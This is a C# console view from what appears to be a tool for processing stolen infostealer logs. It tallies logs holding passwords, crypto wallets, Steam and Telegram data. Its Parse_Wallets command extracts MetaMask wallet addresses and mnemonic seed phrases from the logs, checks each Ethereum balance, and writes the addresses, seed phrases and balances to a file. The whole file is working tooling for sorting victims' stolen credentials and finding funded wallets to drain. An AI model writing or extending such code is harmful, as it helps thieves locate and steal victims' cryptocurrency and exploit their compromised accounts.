using Console.Models;
using Core.Models.Wallets;
using Core.View;
using Core.View.Attributes;
using Core.View.Models.Abstractions;
using Nethereum.Hex.HexTypes;
using Nethereum.Web3;
using Splat;

namespace Console.Views;

public class MainView : ArgsView
{
    private readonly LogsInfo _logs;
    private readonly MetamaskFactory _metamask = new ();
    
    public MainView(IRoot root, LogsInfo logs) : base(root)
    {
        _logs = logs;
    }
    
    [Command]
    public async Task Parse_Wallets()
    {
        var withWallets = _logs.Logs.Where(x => x.HasWallets);
        var filename = Path.Combine("Wallets", $"{new DirectoryInfo(_logs.Path).Name}.txt");
        var web = Locator.Current.GetService<Web3>("Ethereum")!;

        Directory.CreateDirectory("Wallets");
        
        using (var writer = new StreamWriter(filename))
        {
            await foreach (var x in withWallets)
            {
                await writer.WriteLineAsync($"\n{x.Path}");
                
                await foreach (var w in _metamask.Create(x))
                {
                    HexBigInteger? balance = null;

                    try
                    {
                        balance = await web.Eth.GetBalance.SendRequestAsync(w.Address);
                    }
                    catch (Exception e)
                    {
                        System.Console.WriteLine($"Log: {w.Log}\nError: {e.Message}");
                    }
                    
                    System.Console.WriteLine($"{w.Log}\n{w.Address}\n{w.Mnemonic}\n{balance}\n");
                    await writer.WriteAsync($"{w.Address}\n{w.Mnemonic}\n{balance}\n");
                }
            }
        }

        System.Console.Write($"All data saved into {filename}. Press any key for continue."); System.Console.ReadKey();
    }

    public override async Task Build()
    {
        System.Console.WriteLine("Count\tWith Passwords\tWallets\tSteam\tTelegram\n" +
                                 $"{await _logs.Logs.CountAsync()}" +
                                 $"\t{await _logs.Logs.CountAwaitAsync(async x => await x.Passwords.AnyAsync())}" +
                                 $"\t\t{await _logs.Logs.CountAsync(x => x.HasWallets)}" +
                                 $"\t{await _logs.Logs.CountAsync(x => x.HasSteam)}" +
                                 $"\t{await _logs.Logs.CountAsync(x => x.HasTelegram)}");
        System.Console.WriteLine();
        
        await base.Build();
    }
}